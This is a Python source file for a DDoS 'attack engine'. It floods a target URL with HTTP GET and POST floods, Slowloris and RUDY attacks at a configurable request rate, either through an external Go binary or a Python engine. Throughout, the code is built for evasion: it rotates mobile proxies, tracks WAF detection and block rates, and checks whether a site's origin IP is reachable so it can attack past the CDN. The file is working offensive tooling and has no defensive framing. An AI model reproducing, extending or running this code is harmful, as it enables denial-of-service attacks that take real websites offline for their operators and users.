import asyncio
import time
import random
import logging
import subprocess
import json
import os
from typing import Optional, Callable
from dataclasses import dataclass
from enum import Enum

from core.network._proxy.pool import ProxyPool

logger = logging.getLogger("attack_engine")

GO_ENGINE = "bin/go_engine.exe"

class AttackMethod(Enum):
    HTTP_GET_FLOOD = "http_get_flood"
    HTTP_POST_FLOOD = "http_post_flood"
    BYPASS_PATH_FLOOD = "bypass_path_flood"
    SLOWLORIS = "slowloris"
    RUDY = "rudy"

@dataclass
class AttackMetrics:
    completed: int = 0
    failed: int = 0
    timeout: int = 0
    total_requests: int = 0
    current_rps: float = 0.0
    peak_rps: float = 0.0
    avg_response_time_ms: float = 0.0
    active_proxies: int = 0
    attack_method: str = "http_get_flood"
    tier: int = 1
    status: str = "STOPPED"
    blocked_requests: int = 0
    waf_detected: bool = False
    waf_type: str = "none"
    block_rate: float = 0.0

    def to_dict(self) -> dict:
        return {
            "completed": self.completed,
            "failed": self.failed,
            "timeout": self.timeout,
            "total_requests": self.total_requests,
            "current_rps": round(self.current_rps, 1),
            "peak_rps": round(self.peak_rps, 1),
            "avg_response_time_ms": round(self.avg_response_time_ms, 1),
            "active_proxies": self.active_proxies,
            "attack_method": self.attack_method,
            "tier": self.tier,
            "status": self.status,
            "blocked_requests": self.blocked_requests,
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "block_rate": round(self.block_rate, 2),
        }

class AttackEngine:
    def __init__(self, proxy_pool: Optional[ProxyPool] = None, no_proxy: bool = False,
                 origin_ip: Optional[str] = None, proxy_type: str = "mobile",
                 initial_rps: int = 100, start_tier: int = 1,
                 attack_plan: Optional[list] = None):
        self.proxy_pool = proxy_pool
        self.no_proxy = no_proxy
        self.origin_ip = origin_ip
        self.proxy_type = proxy_type
        self.initial_rps = initial_rps
        self.start_tier = start_tier
        self.attack_plan = attack_plan
        self.metrics = AttackMetrics()
        self._on_metrics: Optional[Callable] = None
        self._go_process = None

    def set_metrics_callback(self, cb: Callable):
        self._on_metrics = cb

    async def start_attack(self, url: str, duration: int, method: str = "http_get_flood", rps: int = 100):
        self.metrics = AttackMetrics()
        self.metrics.attack_method = method

        if os.path.exists(GO_ENGINE):
            logger.info("Using Go engine for attack")
            await self._run_go_engine(url, duration, method, rps)
        else:
            logger.info("Go engine not found, using Python engine")
            await self._run_python_engine(url, duration, method, rps)

    async def _run_go_engine(self, url: str, duration: int, method: str, rps: int):
        method_map = {
            "http_get_flood": "http-flood",
            "http_post_flood": "http-flood",
            "slowloris": "slowloris",
        }
        go_method = method_map.get(method, "http-flood")

        args = [
            GO_ENGINE,
            "-target", url,
            "-duration", str(duration),
            "-rps", str(rps),
            "-method", go_method,
        ]

        if self.origin_ip:
            # Health check origin before using it
            import socket as _sock
            _origin_alive = False
            try:
                _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                _s.settimeout(3)
                _s.connect((self.origin_ip, 443))
                _s.close()
                _origin_alive = True
            except Exception:
                _origin_alive = False
            
            if _origin_alive:
                args.extend(["-origin", self.origin_ip])
            else:
                logger.warning(f"Origin IP {self.origin_ip} is DEAD, attacking via CDN")

        self.metrics.status = "RUNNING"
        self._go_process = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        try:
            stdout, stderr = await asyncio.wait_for(
                self._go_process.communicate(), timeout=duration + 30
            )
        except asyncio.TimeoutError:
            if self._go_process:
                self._go_process.kill()
                stdout, _ = await self._go_process.communicate()

        output = stdout.decode(errors="replace").strip()
        for line in reversed(output.split("\n")):
            line = line.strip()
            if line.startswith("{"):
                try:
                    parsed = json.loads(line)
                    self.metrics.completed = parsed.get("completed", 0)
                    self.metrics.failed = parsed.get("failed", 0)
                    self.metrics.timeout = parsed.get("timeout", 0)
                    self.metrics.total_requests = parsed.get("total_requests", 0)
                    self.metrics.current_rps = parsed.get("current_rps", 0)
                    self.metrics.peak_rps = parsed.get("peak_rps", 0)
                except json.JSONDecodeError:
                    pass
                break

        self.metrics.status = "STOPPED"

    async def _run_python_engine(self, url: str, duration: int, method: str, rps: int):
        from core.attack.engines.enhanced import run_enhanced_attack

        proxy_url = None
        if self.proxy_pool and not self.no_proxy:
            ps = await self.proxy_pool.get_proxy(self.proxy_type)
            proxy_url = ps.url if ps else None

        self.metrics.status = "RUNNING"
        result = await run_enhanced_attack(
            url=url, duration=duration, method=method, rps=rps,
            proxy=proxy_url, proxy_pool=self.proxy_pool,
            proxy_type=self.proxy_type, origin_ip=self.origin_ip,
        )

        self.metrics.completed = result.get("completed", 0)
        self.metrics.failed = result.get("failed", 0)
        self.metrics.timeout = result.get("timeout", 0)
        self.metrics.total_requests = result.get("total", 0)
        self.metrics.status = "STOPPED"

    def stop(self):
        if self._go_process:
            try:
                self._go_process.kill()
            except Exception:
                pass
        self.metrics.status = "STOPPED"

    def get_metrics(self) -> dict:
        return self.metrics.to_dict()
